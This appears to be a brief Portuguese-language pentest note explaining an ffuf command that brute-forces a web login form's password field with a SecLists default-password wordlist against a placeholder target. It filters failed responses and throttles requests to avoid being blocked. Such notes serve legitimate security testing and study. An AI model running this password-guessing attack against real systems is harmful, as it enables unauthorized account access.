- `ffuf \`
  `-u http://<IP-ALVO>/login \`
  `-X POST \`
  `-H "Content-Type: application/x-www-form-urlencoded" \`
  `-d "password=FUZZ" \`
  `-w /snap/seclists/current/Passwords/Default-Credentials/default-passwords.txt \`
  `-fr "Invalid password" \`
  `-t 5 -p 0.5 \`
  `-o ffuf_login.json -of json`
	- -X POST e -d "password=FUZZ": envia cada senha da wordlist no campo password, que é o campo do formulário.
	- -H "Content-Type: ...": indica ao servidor que o corpo é um formulário.
	- -w: lista de senhas padrão do SecLists.
	- -fr "Invalid password": oculta as respostas que contêm a mensagem de erro. O que sobrar é candidato a acerto.
	- -t 5 -p 0.5: 5 requisições em paralelo, com meio segundo entre cada uma. Isso reduz o risco de bloqueio no dispositivo.
	- -o ffuf_login.json -of json: salva o resultado em JSON.